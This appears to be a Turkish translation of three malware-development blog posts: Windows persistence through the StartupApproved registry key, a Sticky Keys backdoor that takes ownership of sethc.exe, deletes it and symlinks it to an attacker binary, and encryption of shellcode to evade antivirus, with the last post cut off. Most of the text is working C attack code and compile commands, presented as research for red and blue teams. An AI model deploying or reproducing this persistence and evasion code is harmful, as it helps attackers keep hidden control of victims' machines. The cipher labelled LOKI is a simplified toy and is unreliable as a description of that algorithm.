90. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 24. StartupApproved. Basit C örneği.


﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım kalıcılığına dair ilginç tekniklerden birine, yani StartupApproved Kayıt Defteri anahtarı üzerinden yapılan kalıcılık yöntemine dair kendi araştırmalarıma dayanmaktadır.
StartupApproved
Bu serinin ilk gönderisinde, Kayıt Defteri'nin Run anahtarları aracılığıyla yapılan en popüler ve klasik tekniklerden birinden bahsetmiştim.


Standart "başlangıç" işlemi (Windows Gezgini tarafından kontrol edilen Run ve RunOnce anahtarları, Başlangıç klasörü vb.) tamamlandıktan sonra userinit.exe tarafından kullanılan ve pek yaygın olmayan bir Kayıt Defteri girdisi, aşağıdaki konumda bulunmaktadır:
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
Görünüşe göre, bu anahtar Windows Görev Yöneticisi'nin Başlangıç sekmesi aracılığıyla girişler etkinleştirildiğinde veya devre dışı bırakıldığında doldurulmaktadır:
+++++++++++++++++++++++++++++++++++++++++++++++
İyi haber şu ki, bu kayıt defteri yolunu kalıcılık için kullanabiliriz.
pratik örnek
Öncelikle, aşağıdaki komutla Kayıt Defteri anahtarlarını kontrol edin:
reg query
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"
/s

+++++++++++++++++++++++++++++++++++++++++++++++
Bir sonraki adımda, her zamanki gibi "kötü amaçlı" uygulamamızı oluşturuyoruz (hack.c):
/*
hack.c
simple DLL messagebox
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved) {
switch (nReason) {
case DLL_PROCESS_ATTACH:
MessageBox(
NULL,
"Meow-meow!",
"=^..^=",
MB_OK
);
break;
case DLL_PROCESS_DETACH:
	break;
case DLL_THREAD_ATTACH:
	break;
case DLL_THREAD_DETACH:
	break;
}
return TRUE;
}
Her zamanki gibi, sadece bir meow-meow mesaj kutusu.
Daha sonra, HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved kayıt defteri anahtarımızı aşağıdaki şekilde değiştiriyoruz (pers.c):
/*
pers.c
windows persistence
via StartupApproved
author: @cocomelonc
https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;

BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00};

const char* path =
"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\

StartupApproved\\Run";
const char* evil = "Z:\\2024-03-12-malware-pers-24\\hack.dll";

LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
&hkey);
printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
"successfully open registry key :)\n");

res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
"successfully set registry value :)\n");

// close the registry key
RegCloseKey(hkey);
return 0;
}
Görebileceğiniz gibi, PoC (kanıt niteliğinde konsept) mantığımız oldukça basit - kayıt defteri girdisinin değerini 0x02 0x00... şeklinde bir ikili değere ayarlıyoruz.
Demo
Hadi her şeyi çalışırken görelim. Öncelikle, "kötü amaçlı" DLL'imizi derleyelim:
x86_64-w64-mingw32-g++ -shared -o hack.dll hack.c -fpermissive
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, PoC'umuzu derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++

Son olarak, bunu kurbanın makinesinde çalıştıralım. Benim durumumda, Windows 10 x64 v1903 sanal makinemde şu şekilde görünüyor:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, Kayıt Defteri'ni tekrar kontrol ettim:
reg query
"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved"
/s
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra çıkış yapıp tekrar giriş yaptım:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Ancak beklenmedik bir şekilde benim için çalışmadı…
Daha sonra sadece giriş adını güncelledim:
+++++++++++++++++++++++++++++++++++++++++++++++

Çıkış yapıp tekrar giriş yaptım, biraz bekledim… ve mükemmel şekilde çalıştı…
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Bu yüzden betiğimde bir satırı güncelledim:
/*
pers.c
windows persistence
via StartupApproved
author: @cocomelonc
https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
*/
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
HKEY hkey = NULL;
BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00};

const char* path =
"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\
StartupApproved\\Run";
const char* evil = "C:\\temp\\hack.dll";

LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
&hkey);
printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
"successfully open registry key :)\n");

res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
"successfully set registry value :)\n");

// close the registry key
RegCloseKey(hkey);
return 0;
}
Fakat burada bir püf noktası var. Bu özelliği test ettiğim bazı durumlarda, Skype gibi uygulamalar benim için otomatik olarak başlatıldı:
+++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey beklendiği gibi mükemmel çalıştı! =..= :)


Bu teknik, APT28, APT29, Kimsuky ve APT33 gibi APT grupları tarafından aktif olarak kullanılmaktadır.
Dürüst olmak gerekirse, bu yöntem kurbanları kandırmadaki aşırı kullanışlılığı nedeniyle oldukça yaygın ve popülerdir.
Umarım bu gönderi, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyeleri için yeni bir silah ekler.
ATT&CK MITRE: T1547.001
Malware persistence: part 1
APT28
APT29
Kimsuky
APT33
Github’taki kaynak kod


91. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 25. Meşru dosyadan kötü amaçlı dosyaya sembolik bağlantı oluşturma. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Önceki gönderilerden birinde, Erişilebilirlik özellikleri aracılığıyla popüler kalıcılık tekniklerinden bahsetmiştim. APT3, APT29 ve APT41 gibi APT grupları, bu özelliği bilgisayarlara saldırmak için kullandı.
Bu gönderide, aynı tekniği farklı bir mantıkla gösteriyorum: basitçe meşru bir uygulamadan kötü amaçlı bir dosyaya sembolik bağlantı oluşturma.
Sembolik Bağlantı Oluşturma: Erişilebilirlik Özellikleri
Saldırganlar tarafından kalıcılık sağlamak için kullanılan iyi bilinen bir yöntem, Windows Erişilebilirlik özelliklerini değiştirmek veya yönlendirmek için sembolik bağlantılar (symlink) oluşturmaktır. Bu yöntem, yalnızca ikili dosyaları değiştirmekten daha karmaşıktır çünkü geçerli bir sistem dosyasından veya özelliğinden kötü amaçlı bir dosyaya sembolik bir bağlantı oluşturmayı içerir. Sistem veya kullanıcı orijinal dosyaya veya özelliğe erişmeye çalıştığında, farkında olmadan kötü amaçlı bir dosyaya yönlendirilir.
pratik örnek
Mantık oldukça basit görünebilir:
#include <windows.h>
#include <stdio.h>
int main() {
// path to the legitimate binary (e.g., Sticky Keys)
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
// path to the malicious binary
const char* meowApp = "Z:\\hack.exe";

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

// create the symbolic link
if (!CreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
}
ancak gerçekte her şey biraz daha karmaşıktır.
Diyelim ki elimizde bir “kötü amaçlı yazılım” var:
/*
* hack.c
* "malware" for symlink
* persistence trick
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/

#include <windows.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
LPSTR lpCmdLine, int nCmdShow) {
MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
return 0;
}
Ve bir sembolik bağlantı oluşturmak istiyorum, hedef meşru uygulama şu olsun:
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
Öncelikle, izinlere ihtiyacımız var:
SE_TAKE_OWNERSHIP_NAME
SE_DEBUG_NAME
SE_RESTORE_NAME
SE_BACKUP_NAME
Bunun için setPrivilege fonksiyonunu kullanıyoruz:
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(),
TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n", priv);
return res;
}
Gördüğünüz gibi, bu fonksiyon geçerli işlem için belirtilen bir ayrıcalığı etkinleştirmek için kullanılır.
Daha sonra, gerekli erişim izinleri (WRITE_OWNER ve WRITE_DAC) ile meşru ikili dosyayı açıyoruz:
HANDLE hFile = CreateFileA((LPCSTR)legitApp, WRITE_OWNER | WRITE_DAC, FILE_SHARE_READ, NULL,
Ardından, belirteç bilgilerini alıyoruz:
// obtain the SID for the current user
HANDLE hToken;
DWORD dwSize = 0;
PTOKEN_USER pTokenUser = NULL;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
printf("Failed to open process token: %d\n", GetLastError());
CloseHandle(hFile);
return 1;
}
printf("open process token: ok\n");

// get the required size for the token information
GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
pTokenUser = (PTOKEN_USER)malloc(dwSize);
if (pTokenUser == NULL) {
printf("failed to allocate memory for token information\n");
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("allocate memory token info: ok\n");

// get the token information
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
printf("failed to get token information: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("get token info: ok\n");
Sonraki adımda, meşru ikili dosyanın sahipliğini geçerli kullanıcı olarak değiştirmemiz gerekiyor:
// initialize a security descriptor
SECURITY_DESCRIPTOR sd;
if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
printf("failed to initialize security descriptor: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("init security descriptor: ok\n");

// set the owner in the security descriptor
if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
printf("failed to set security descriptor owner: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting security descriptor owner: ok\n");

// apply the security descriptor to the file
if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
printf("error setting file ownership: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting file ownership: ok\n");
InitializeSecurityDescriptor – yeni bir güvenlik tanımlayıcısı başlatır.
SetSecurityDescriptorOwner – güvenlik tanımlayıcısındaki sahibi, geçerli kullanıcının SID'si (Güvenlik Tanımlayıcısı) olarak ayarlar.
SetFileSecurityA – sahipliği değiştirmek için güvenlik tanımlayıcısını meşru ikili dosyaya uygular.
Daha sonra, dosyaya yeni ACL uygulanır:
// set full control for the current user
EXPLICIT_ACCESS ea;
PACL pNewAcl = NULL;

ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = GENERIC_ALL;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
printf("error setting new ACL: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting new ACL: ok\n");

if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION,
NULL, NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
printf("error setting security info: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
LocalFree(pNewAcl);
return 1;
}
printf("setting security info: ok\n");

free(pTokenUser);
CloseHandle(hToken);
LocalFree(pNewAcl);

Son olarak, orijinal dosyayı silin ve sembolik bağlantıyı ayarlayın:

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

HMODULE kernel = GetModuleHandle("kernel32.dll");
pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

// create the symbolic link
if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
Gördüğünüz gibi, bu oldukça karmaşıktır. Bu PoC, Windows API'yi kullanarak ayrıcalıkları ayarlama, dosya sahipliğini değiştirme, ACL’leri ayarlama, dosya silme ve sembolik bağlantı oluşturma işlemlerini nasıl gerçekleştireceğimizi göstermektedir.
Sistem32 klasöründen orijinal dosyayı hemen silmeye çalışırsanız, "erişim reddedildi" hatası alırsınız.
Ayrıca, mevcut kullanıcı için SID elde etme ve ayarlama işlemleri yanlışsa, "hata 1337 geçersiz sahip" gibi bir hata alabilirsiniz.
Nihai kaynak kodu şu şekilde görünmektedir  pers.c:
/*
* pers.c
* symlink persistence trick
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/07/08/malware-pers-25.html
*/
#include <windows.h>
#include <stdio.h>
#include <aclapi.h> // for OWNER_SECURITY_INFORMATION
#include <sddl.h> // for ConvertStringSidToSid ???

BOOLEAN (WINAPI * pCreateSymbolicLinkA)(
LPCSTR lpSymlinkFileName,
LPCSTR lpTargetFileName,
DWORD dwFlags
);

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
HANDLE token;
TOKEN_PRIVILEGES tp;
LUID luid;
BOOL res = TRUE;

tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token))
res = FALSE;
if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
printf(res ? "successfully enable %s :)\n" :
"failed to enable %s :(\n"
,
priv);
return res;
}
int main() {
// path to the legitimate binary (e.g., Sticky Keys)
const char* legitApp = "C:\\Windows\\System32\\sethc.exe";
// path to the malicious binary
const char* meowApp = "Z:\\hack.exe";

if (!setPrivilege(SE_TAKE_OWNERSHIP_NAME)) return-1;
if (!setPrivilege(SE_DEBUG_NAME)) return-1;
if (!setPrivilege(SE_RESTORE_NAME)) return-1;
if (!setPrivilege(SE_BACKUP_NAME)) return-1;

HANDLE hFile = CreateFileA((LPCSTR)legitApp, GENERIC_WRITE,
FILE_SHARE_READ, NULL, OPEN_EXISTING,
FILE_ATTRIBUTE_NORMAL, NULL);

// obtain the SID for the current user
HANDLE hToken;
DWORD dwSize = 0;
PTOKEN_USER pTokenUser = NULL;
if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
printf("Failed to open process token: %d\n", GetLastError());
CloseHandle(hFile);
return 1;
}
printf("open process token: ok\n");

// get the required size for the token information
GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
pTokenUser = (PTOKEN_USER)malloc(dwSize);
if (pTokenUser == NULL) {
printf("failed to allocate memory for token information\n");
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("allocate memory token info: ok\n");

// get the token information
if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
printf("failed to get token information: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("get token info: ok\n");

// initialize a security descriptor
SECURITY_DESCRIPTOR sd;
if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION)) {
printf("failed to initialize security descriptor: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("init security descriptor: ok\n");

// set the owner in the security descriptor
if (!SetSecurityDescriptorOwner(&sd, pTokenUser->User.Sid, FALSE)) {
printf("failed to set security descriptor owner: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting security descriptor owner: ok\n");

// apply the security descriptor to the file
if (!SetFileSecurityA(legitApp, OWNER_SECURITY_INFORMATION, &sd)) {
printf("error setting file ownership: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting file ownership: ok\n");

// set full control for the current user
EXPLICIT_ACCESS ea;
PACL pNewAcl = NULL;

ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
ea.grfAccessPermissions = GENERIC_ALL;
ea.grfAccessMode = SET_ACCESS;
ea.grfInheritance = NO_INHERITANCE;
ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
ea.Trustee.ptstrName = (LPSTR)pTokenUser->User.Sid;

if (SetEntriesInAcl(1, &ea, NULL, &pNewAcl) != ERROR_SUCCESS) {
printf("error setting new ACL: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
return 1;
}
printf("setting new ACL: ok\n");

if (SetSecurityInfo(hFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL,
NULL, pNewAcl, NULL) != ERROR_SUCCESS) {
printf("error setting security info: %d\n", GetLastError());
free(pTokenUser);
CloseHandle(hToken);
CloseHandle(hFile);
LocalFree(pNewAcl);
return 1;
}
printf("setting security info: ok\n");

free(pTokenUser);
CloseHandle(hToken);
LocalFree(pNewAcl);

// delete the original file (requires administrative privileges)
if (!DeleteFileA((LPCSTR)legitApp)) {
printf("error deleting original file: %d\n", GetLastError());
return 1;
}
printf("original file deleted successfully\n");
CloseHandle(hFile);

HMODULE kernel = GetModuleHandle("kernel32.dll");
pCreateSymbolicLinkA = (BOOLEAN(WINAPI *)(LPCSTR, LPCSTR, DWORD))
GetProcAddress(kernel, (LPCSTR)"CreateSymbolicLinkA");

// create the symbolic link
if (!pCreateSymbolicLinkA((LPCSTR)legitApp, (LPCSTR)meowApp, 0)) {
printf("error creating symlink: %d\n", GetLastError());
return 1;
}
printf("symlink to meow created successfully =^..^=\n");
return 0;
}
Dikkat edin, bu PoC, Windows API işlevleri, dosya güvenliği ve SID (Security Identifier) işleme için gerekli başlık dosyalarını içerir. Ayrıca, CreateSymbolicLinkA fonksiyonuna bir işlev işaretçisi içerir (mingw derleyicim hatasız derlemeyi reddettiği için).
Demo
Şimdi her şeyi çalışırken görelim.
Meow-meow “kötü amaçlı yazılımımızı” hack.c derleyelim:
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive

+++++++++++++++++++++++++++++++++++++++++++++++
Ve kalıcılık betiğimizi derleyelim:
x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
+++++++++++++++++++++++++++++++++++++++++++++++
Daha sonra, test kurban makinemizde (Windows 11 x64) çalıştıralım:
.\pers.exe
+++++++++++++++++++++++++++++++++++++++++++++++

Gördüğünüz gibi, sembolik bağlantı başarıyla oluşturuldu.
Son olarak, Shift tuşuna 5 kez basalım:
+++++++++++++++++++++++++++++++++++++++++++++++
hack.exe dosyasının özelliklerine dikkat edin:
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey beklendiği gibi çalıştı. Mükemmel!=..=
Bu PoC, bir saldırganın bir Erişilebilirlik özelliğini kötü amaçlı bir yürütülebilir dosyaya yönlendirmek için nasıl sembolik bağlantı oluşturabileceğini göstermektedir.
Bu gönderinin, mavi takım çalışanlarının bu ilginç teknik hakkında farkındalığını artırmasını ve kırmızı takım üyeleri için bir silah eklemesini umuyorum.
CreateSymbolicLinkA
Malware persistence - part 12. Accessibility features
Github’taki kaynak kod

92.Kötü amaçlı yazılım ve kriptografi araştırması - bölüm 1 (29): LOKI payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, payload’u farklı bir mantıkla şifreleyerek antivirüs motorlarından kaçınma konusundaki kendi araştırmamın bir sonucudur: LOKI simetrik anahtar blok şifreleme. Her zamanki gibi çeşitli kripto algoritmalarını incelerken, bunu payload’u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.

LOKI

Lawrie Brown, Josef Pieprzyk ve Jennifer Seberry adlı üç Avustralyalı kriptograf, LOKI’yi (LOKI89) ilk olarak 1990 yılında “LOKI” adı altında yayımladı. LOKI89, inceleme için Avrupa RIPE projesine sunuldu, ancak seçilmedi. LOKI, DES’e olası bir alternatif olarak sunuldu.

pratik örnek

Hadi bunu uygulayalım. LOKI algoritması 64 bitlik bir blok ve 64 bitlik bir anahtar kullanır. LOKI blok şifreleme fonksiyonu, bir Feistel yapısı üzerinden birden çok tur boyunca şifreleme yapar. Aşağıda bu fonksiyonun nasıl çalıştığının ayrıntılı adım adım açıklaması bulunmaktadır:

void loki_encrypt(u8 *block, u8 *key) {
// LOKI encryption (simplified for demo)
u32 left = ((u32)block[0] << 24) |
((u32)block[1] << 16) | ((u32)block[2] << 8) |
(u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
64 bitlik blok iki 32 bitlik yarıya bölünür: sol ve sağ:
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];
Sol yarı (left), bloğun ilk dört baytının birleştirilmesiyle oluşturulur.
Sağ yarı (right), bloğun son dört baytının birleştirilmesiyle oluşturulur.


Şifreleme işlemi birden çok tur içerir (benim uygulamamda 16 tur):
for (int round = 0; round < ROUNDS; round++) {
u32 temp = right;
right = left ^ (right + ((u32)key[round % KEY_SIZE]));
left = temp;
}
Her tur için:


• temp, mevcut right değerini saklar.
• right, left ve right ile bir anahtar değerin toplamının XOR işlemi uygulanmasıyla güncellenir. Anahtar değeri, key[round % KEY_SIZE] kullanılarak döngüsel olarak seçilir.
• left, temp değişkeninde saklanan önceki right değerine güncellenir.


Son olarak, şifrelenmiş bloğun mantığını yeniden oluşturma:
block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
Tüm turlar tamamlandıktan sonra, sol ve sağ yarılar orijinal bloğa geri birleştirilir.
32 bitlik left ve right değerleri baytlara bölünerek tekrar blok dizisine kaydedilir.


Benim örneğimde, bu fonksiyon LOKI şifreleme sürecinin temel işlemlerine odaklanarak verilerin bölünmesi, işlenmesi ve yeniden birleştirilmesini içeren basitleştirilmiş bir görünüm sunmaktadır.

Ardından, şifre çözme mantığını yeniden uygulama:
void loki_decrypt(u8 *block, u8 *key) {
// LOKI decryption (simplified for demo)
u32 left = ((u32)block[0] << 24) | ((u32)block[1] << 16) |
((u32)block[2] << 8) | (u32)block[3];
u32 right = ((u32)block[4] << 24) | ((u32)block[5] << 16) |
((u32)block[6] << 8) | (u32)block[7];

for (int round = ROUNDS - 1; round >= 0; round--) {
u32 temp = left;
left = right ^ (left + ((u32)key[round % KEY_SIZE]));
right = temp;
}

block[0] = (left >> 24) & 0xFF;
block[1] = (left >> 16) & 0xFF;
block[2] = (left >> 8) & 0xFF;
block[3] = left & 0xFF;
block[4] = (right >> 24) & 0xFF;
block[5] = (right >> 16) & 0xFF;
block[6] = (right >> 8) & 0xFF;
block[7] = right & 0xFF;
}
Daha sonra, LOKI blok şifreleme kullanarak belirli bir shellcode'u şifrelemek için loki_encrypt_shellcode fonksiyonuna ihtiyacımız var:
void loki_encrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Nasıl çalışır?

Shellcode'u 8 baytlık bloklar halinde döngüye sok:
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_encrypt(shellcode + i * BLOCK_SIZE, key);
}
Her 8 baytlık blok için, mevcut blok ve şifreleme anahtarı ile loki_encrypt fonksiyonu çağrılır. shellcode + i * BLOCK_SIZE, shellcode içindeki mevcut 8 baytlık bloğun adresini hesaplar.


Tüm tam 8 baytlık bloklar işlendiğinde, fonksiyon eksik kalan ve tam bir blok oluşturmayan bayt olup olmadığını kontrol eder.
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_encrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
Not: Her zamanki gibi, bir doldurma dizisi (padding array) pad, 8 bayt uzunluğunda ve 0x90 (x86 assembly’de NOP talimatı) ile başlatılmıştır.


Bu fonksiyon, LOKI algoritmasını kullanarak tüm shellcode'un, uzunluğu ne olursa olsun, düzgün şekilde şifrelenmesini sağlar ve eksik blokları uygun şekilde işler.


Ardından, şifre çözme mantığını oluştur:
void loki_decrypt_shellcode(unsigned char* shellcode, int shellcode_len) {
int i;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	loki_decrypt(shellcode + i * BLOCK_SIZE, key);
}
// check if there are remaining bytes
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
memcpy(pad, shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE,
remaining);
loki_decrypt(pad, key);
memcpy(shellcode + (shellcode_len / BLOCK_SIZE) * BLOCK_SIZE, pad,
remaining);
}
}
Son payload’u çalıştırmak için tam kaynak kodu (hack.c) şu şekildedir:
/*
* hack.c
* encrypt/decrypt payload via LOKI
* author: @cocomelonc
